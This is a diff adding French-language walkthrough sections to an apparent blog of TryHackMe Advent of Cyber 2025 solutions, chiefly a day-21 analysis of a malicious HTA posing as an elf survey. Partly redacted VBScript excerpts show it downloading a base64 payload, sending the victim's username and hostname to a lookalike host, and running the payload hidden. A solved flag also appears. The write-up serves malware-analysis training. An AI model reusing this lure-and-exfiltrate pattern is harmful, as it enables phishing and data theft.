@@ -32,6 +32,8 @@ Lien vers l'épreuve : <https://tryhackme.com/room/adventofcyber2025>
 * [Jour 18 : Obfuscation - The Egg Shell File](#jour-18--obfuscation---the-egg-shell-file)
 * [Jour 19 : ICS/Modbus - Claus for Concern](#jour-19--icsmodbus---claus-for-concern)
 * [Jour 20 : Race Conditions - Toy to The World](#jour-20--race-conditions---toy-to-the-world)
+* [Jour 21 : Malware Analysis - Malhare.exe](#jour-21--malware-analysis---malhareexe)
+* [Jour 22 : C2 Detection - Command \& Carol](#jour-22--c2-detection---command--carol)
 
 ## Jour 1 : [Linux CLI - *Shells Bells*](https://tryhackme.com/room/linuxcli-aoc2025-o1fpqkvxti)
 
@@ -2995,3 +2997,150 @@ Nous répéterons l'opération 10 fois puisqu'après notre commande initiale il 
 Nous répétons les mêmes opérations sur la peluche de lapin pour obtenir le second flag.
 
 {% include elements/figure_spoil.html image="images/THM/AoC2025/20251220_Oversold2.png" caption="Le flag apparaît de retour sur la page principale" %}
+
+## Jour 21 : [Malware Analysis - Malhare.exe](https://tryhackme.com/room/htapowershell-aoc2025-p2l5k8j1h4)
+
+![AoC 2025 jour 21](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1763892822100.png)
+
+>Le défi du jour consiste à analyser un malware, il est fortement recommandé d'utiliser l'AttackBox à disposition
+
+Le contenu à analyser est un fichier HTA (HTML Application) permettant de faire tourner du code sur la machine cliente (ou victime) et non serveur.
+
+Intéressons nous d'abord à l'en-tête du fichier. Nous y trouvons le nom de l'application.
+
+{% capture spoil %}
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+<title>[...expurgé...]</title>
+<hta:application id="APP123080"
+applicationname="Festival Elf Survey"
+icon="logo.ico"
+border="thin"
+caption="yes"
+maximizebutton="no"
+minimizebutton="no"
+singleinstance="yes"
+windowstate="normal"
+sysmenu="yes">
+</hta:application>
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+En avançant dans le programme, nous arrivons sur la partie `<script type="text/vbscript">` contenant une fonction qui télécharge des questions depuis un serveur distant. Cette fonction attire l'attention en raison d'un caractère surnuméraire dans l'URL (*typosquatting*)
+
+{% capture spoil %}
+
+```vb
+Function ' [...expurgé...]()
+    Dim IE, result, decoded, decodedString
+    Set IE = CreateObject("InternetExplorer.Application")
+    IE.navigate2 "http://[...expurgé...]"
+    Do While IE.ReadyState < 4
+    Loop
+    result = IE.document.body.innerText
+    IE.quit
+
+    decoded = decodeBase64(result)
+    decodedString = RSBinaryToString(decoded)
+    Call provideFeedback(decodedString)
+  End Function
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+En continuant l'exploration, nous arrivons sur une partie destinée à rendre plus "légitime" le fichier HTA en affichant de vraies questions pour se faire passer pour un vrai système de sondage.
+
+{% include elements/figure_spoil.html image="images/THM/AoC2025/20251221_Questions.png" caption="Questions posées pour paraître légitime" %}
+
+Pour motiver un maximum de personnes à répondre au faux sondage, un message indiquant un voyage à gagner sera affiché à l'écran.
+
+{% capture spoil %}
+
+```html
+<div>All participants will be entered into a prize draw for a chance to win a trip to [...expurgé...]!</div>
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+Dans la fonction `provideFeedback()`, on constate que des données sur la machine et la personne lançant l'application sont récupérées et exfiltrées.
+
+Nous observons également une commande `runObject.Run` qui est appelée dans la première fonction identifiée, et qui transmet le contenu du fichier contenant censément les questions du sondage afin que celui-ci soit exécuté.
+
+{% capture spoil %}
+
+```vb
+Function provideFeedback(feedbackString)
+    Dim strHost, strUser, strDomain
+    On Error Resume Next
+    strHost = CreateObject("WScript.Network").'[...expurgé...]
+    strUser = CreateObject("WScript.Network").'[...expurgé...]
+    
+    Dim IE
+    Set IE = CreateObject("InternetExplorer.Application")
+    IE.navigate2 "http://survey.bestfestiivalcompany.com/[...expurgé...]?u=" & strUser & "?h=" & strHost
+    Do While IE.ReadyState < 4
+    Loop
+    IE.quit 
+          
+    Dim runObject
+
+    Set runObject = CreateObject("Wscript.Shell")
+    runObject.Run "[...expurgé...] " & feedbackString, 0, False
+    
+End Function
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+En récupérant le contenu du soi-disant `survey_questions.txt` nous constatons qu'il est chiffrée en `base64`. Il y cache un contenu chiffré avec `ROT13`, méthode de chiffrement décalant toutes les lettres de 13 rangs. Cette méthode est facilement réversible car avec 26 caractères, il suffit de faire 2 fois une opération `ROT13` pour déchiffré le contenu.
+
+{% capture spoil %}
+
+```powershell
+function AABB {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory)]
+        [string]$Text
+    )
+
+    $sb = New-Object System.Text.StringBuilder $Text.Length
+    foreach ($ch in $Text.ToCharArray()) {
+        $c = [int][char]$ch
+
+        if ($c -ge 65 -and $c -le 90) {           
+            $c = (($c - 65 + 13) % 26) + 65
+        }
+        elseif ($c -ge 97 -and $c -le 122) {      
+            $c = (($c - 97 + 13) % 26) + 97
+        }
+
+        [void]$sb.Append([char]$c)
+    }
+    $sb.ToString()
+}
+
+$flag = 'GUZ{Znyjner.Nanylfrq}'
+
+$deco = AABB -Text $flag
+Write-Output $deco
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+[CyberChef](https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)) nous permet de retrouver le contenu original du flag.
+
+{% include elements/figure_spoil.html image="images/THM/AoC2025/20251221_Flag.png" caption="Flag déchiffré en ROT13" %}
+
+## Jour 22 : [C2 Detection - Command & Carol](https://tryhackme.com/room/detecting-c2-with-rita-aoc2025-m9n2b5v8c1)
+
+![AoC 2025 jour 22](https://tryhackme-images.s3.amazonaws.com/user-uploads/66c44fd9733427ea1181ad58/room-content/66c44fd9733427ea1181ad58-1761803168624.svg)
